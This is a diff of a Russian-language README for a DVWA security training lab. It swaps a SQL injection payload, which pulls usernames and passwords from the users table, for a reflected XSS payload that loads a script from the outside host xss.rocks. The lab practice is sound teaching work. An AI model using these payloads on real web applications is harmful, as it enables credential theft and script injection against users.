@@ -40,8 +40,8 @@ terraform apply
 - в самом низу страницы будет кнопка "create /reset database" - нажмите ее
 - далее внизу нажмите login
 - во вкладке "DVWA Security" поменяйте уровень на "low"
-- перейдите во вкладку "SQL Injection" и введите в поле User ID следующее: %' and 1=0 union select null, concat(user,':',password) from users #
+- перейдите во вкладку "XSS reflected" и введите в поле "whats your name" - <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT> 
 
-![image](https://user-images.githubusercontent.com/85429798/120918060-252fb680-c6bb-11eb-8398-32c98e2f70ca.png)
+![image](https://user-images.githubusercontent.com/85429798/120922458-ec4f0c00-c6d1-11eb-8761-e1604ef02409.png)
 
 
